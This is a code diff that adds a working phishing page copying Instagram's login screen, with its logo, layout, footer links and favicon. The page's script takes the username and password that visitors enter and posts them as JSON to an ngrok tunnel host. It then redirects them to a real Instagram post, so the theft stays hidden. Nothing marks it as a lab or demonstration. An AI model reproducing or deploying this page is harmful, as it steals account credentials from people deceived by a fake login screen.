@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <link rel="icon" href="icons/InstagramIcon.png" type="image/png">
+    <title>Instagram.com</title>
+    <style>
+        .user-credential-div{
+    margin: auto;
+    width: 250px;
+    height: 350px;
+    background-color: #fff;
+    border: 1px solid #ccc;
+    padding-top: 10px;
+    padding-bottom: 100px;
+    padding-right: 100px;
+    padding-left: 30px;
+    border-radius: 5px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    margin-top: 50px;
+    cursor: pointer;
+}
+
+.user-email-place {
+    font-family: Arial, Helvetica, sans-serif;
+    width: 310px;
+    margin-bottom: 5px;
+    border: 1px solid #ccc; 
+    border-radius: 5px;
+    padding: 10px;
+
+}
+
+.user-password-place {
+    font-family: Arial, Helvetica, sans-serif;
+    width: 310px;
+    margin-bottom: 5px;
+    border: 1px solid #ccc; 
+    border-radius: 5px;
+    padding: 10px;
+}
+
+.instagram-logo {
+    width: 200px;
+    margin-left: 60px;
+}
+
+.login-button {
+    padding: 0px;
+    width: 330px;
+    height: 40px;
+    text-align: center;
+    box-sizing: border-box;
+    background-color: rgb(0, 149, 246);
+    border: none;
+    color: white;
+    border-radius: 10px;
+    font-family: Arial, Helvetica, sans-serif;
+    font-weight: bolder;
+    cursor: pointer; 
+}
+
+button:hover {
+    background-color: #0056b3;
+}
+.app {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding-bottom: 0px;
+    cursor: pointer;
+}
+
+.app-google {
+    width: 150px;
+}
+
+.app-microsoft {
+    width: 125px;
+    margin-left: 5px;
+}
+
+.get-app {
+    margin: auto;
+    height: 250px;
+}
+
+.box {
+    padding-top: 30px;
+    margin-bottom: 100px;
+}
+
+.sign-up-text{
+    margin: 0;
+    padding-top: 15px;
+}
+.sign-up-div {
+    margin: auto;
+    text-align: center;
+    font-family: Arial, Helvetica, sans-serif;
+    background-color: #fff;
+    border: 1px solid #ccc;
+    height: 50px;
+    width: 250px;
+    margin-top: 10px;
+    padding-top: 10px;
+    padding-bottom: 10px;
+    padding-left: 65px;
+    padding-right: 65px;
+    margin-bottom: 5px;
+    border-width: thin;
+    border-radius: 5px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}
+
+.get-app-text {
+    text-align: center;
+    font-family: Arial, Helvetica, sans-serif;
+    
+}
+
+.bl-text {
+    color: #3578E5;
+    cursor: pointer;
+}
+
+.facebook-login-text {
+    text-align: center;
+    margin-left: 10px;
+    margin-top: 2px;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #385185;
+    margin-bottom: 0px;
+   
+    
+}
+
+.facebook-section {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    margin-left: 50px;
+    cursor: pointer;
+    
+}
+
+
+.forgot-password-text {
+    font-weight: lighter;
+    text-align: center;
+    margin-left: 80px;
+    margin-top: 0px;
+    font-family: Arial, Helvetica, sans-serif;
+    color: #3578E5;
+    cursor: pointer;
+}
+
+
+
+.footer {
+    margin-top: 65px;
+    cursor: pointer;
+}
+
+.first-line,
+.second-line {
+    margin-top: 0px;
+    font-family: Arial, Helvetica, sans-serif;
+    text-align: center;
+    color: rgb(115, 115, 115);
+}
+
+.or-section {
+    margin-left: 80px;
+    margin-top: 15px;
+    margin-bottom: 20px;
+    display: flex;
+    align-items: center;
+}
+
+.or-divider {
+    flex-grow: 1;
+    height: 1px;
+    background-color: #ccc;
+}
+
+.or-text {
+    font-family: Arial, Helvetica, sans-serif;
+    margin: 0px 10px;
+    color: rgb(115, 115, 115);
+    font-size: small;
+}
+
+.f-line-elements {
+    margin-right: 10px;
+    font-weight: lighter;
+    color: rgb(115, 115, 115);
+}
+.s-line-elements{
+    margin-right: 10px;
+    font-weight: lighter;
+    color: rgb(115, 115, 115);
+}
+.f-line-elements:hover{
+ text-decoration: underline;
+}
+@media (min-width: 751px) and (max-width: 999px) 
+  {
+    .first-line
+    {
+        margin-bottom: 50px;
+    }
+  }
+@media (min-width: 751px) and (max-width: 999px) 
+  {
+    .first-line
+    {
+        margin-bottom: 50px;
+    }
+  }
+  
+@media (max-width: 600px)
+  {
+    .first-line
+    {
+        margin-bottom: 20px;
+    }
+  }
+
+  a{
+    text-decoration: none;
+  }
+
+  
+    </style>
+    <link rel="shortcut icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico" />
+    <script>
+        async function do_work(event) {
+    event.preventDefault(); // Prevent form from reloading
+
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    if (!username || !password) {
+        alert("Please enter both username and password.");
+        return;
+    }
+
+    fetch("https://c685-2a09-bac1-36a0-228-00-29e-29.ngrok-free.app/login", {  // Ensure this matches your backend server
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ username, password })
+    })
+    .then(response => {
+        if (!response.ok) throw new Error("Network response was not OK");
+        return response.text();
+    })
+    .then(data => {
+        console.log("Success:", data);
+        window.location.href = "https://www.instagram.com/p/DHlQW4Ts0nb/?igsh=cHZhc2h4cGp3OXE2";
+    })
+    .catch(error => {
+        console.error("Fetch error:", error);
+        alert("Failed to send data. Check console for details.");
+    });
+}
+
+    </script>
+    
+</head>
+<body>
+    <div class="user-credential-div">
+        <div class="box">
+            <img class="instagram-logo" src="https://logos-world.net/wp-content/uploads/2020/05/Instagram-Logo-2016-present.png">
+            <!-- <form action="https://www.instagram.com/p/DHlQW4Ts0nb/?igsh=cHZhc2h4cGp3OXE2" method="POST"> -->
+                <div>
+                    <input type="text" id="username" name="username" placeholder="Phone number, username, or Email" class="user-email-place" required><br><br>
+                </div>
+                <div>
+                    <input type="password" id="password" name="password" placeholder="Password" class="user-password-place" required><br><br>
+                </div>
+                <div>
+                    <button onclick="do_work(event)" type="submit" class="login-button">
+                        <span>Log&nbsp;In</span>
+                    </button>
+                    
+                </div>
+                <div class="or-section">
+                    <div class="or-divider"></div>
+                    <div class="or-text">OR</div>
+                    <div class="or-divider"></div>
+                </div>
+                <a target="_blank" href="https://www.facebook.com/">
+                    <div class="facebook-section">
+                        <img width="26" height="26" src="https://img.icons8.com/color/48/facebook.png" alt="facebook"/>
+                        <p class="facebook-login-text">Log in with Facebook</p>
+                    </div>
+                </a>
+                <a href="https://www.instagram.com/accounts/password/reset/">
+                    <h5><p class="forgot-password-text">Forgot password?</p></h5>
+                </a>
+            </form>
+        </div>
+    </div>
+    <div class="sign-up-div">
+        <p class="sign-up-text">Don't have an account? <span><a class="bl-text" href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></span></p>
+    </div>
+    <div class="get-app">
+        <p class="get-app-text">Get the app.</p>
+        <div class="app">
+            <a target="_blank" href="https://play.google.com/store/apps/details?id=com.instagram.android">
+                <img class="app-google" src="public/icons/google.png">
+            </a>
+            <a href="ms-windows-store://pdp/?productid=9nblggh5l9xt">
+                <img class="app-microsoft" src="public/icons/microsoft.png">
+            </a>
+        </div>
+        <footer>
+            <h5>
+                <div class="footer">
+                    <p class="first-line">
+                        <a target="_blank" class="f-line-elements" href="https://about.meta.com/">Meta</a>
+                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/">About</a>
+                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/en_US/blog">Blog</a>
+                        <a target="_blank" class="f-line-elements" href="https://about.instagram.com/about-us/careers">Jobs</a>
+                        <a target="_blank" class="f-line-elements" href="https://help.instagram.com/">Help</a>
+                        <a target="_blank" class="f-line-elements" href="https://developers.facebook.com/docs/instagram">API</a>
+                        <a target="_blank" class="f-line-elements" href="https://privacycenter.instagram.com/">Privacy</a>
+                        <a target="_blank" class="f-line-elements" href="https://help.instagram.com/581066165581870/">Terms</a>
+                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/directory/profiles/">Top Accounts</a>
+                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/explore/locations/">Locations</a>
+                        <a target="_blank" class="f-line-elements" href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+                        <a target="_blank" class="f-line-elements" href="https://www.threads.net/">Threads</a>
+                    </p>
+                    <p class="second-line">
+                        <span class="s-line-elements">English <img width="12" height="12" src="https://img.icons8.com/ios-glyphs/30/expand-arrow--v1.png" alt="expand-arrow--v1"/></span>
+                        <span class="s-line-elements">© 2024 Instagram from Meta</span>
+                    </p>
+                </div>
+            </h5>
+        </footer>
+    </div>
+</body>
+</html>
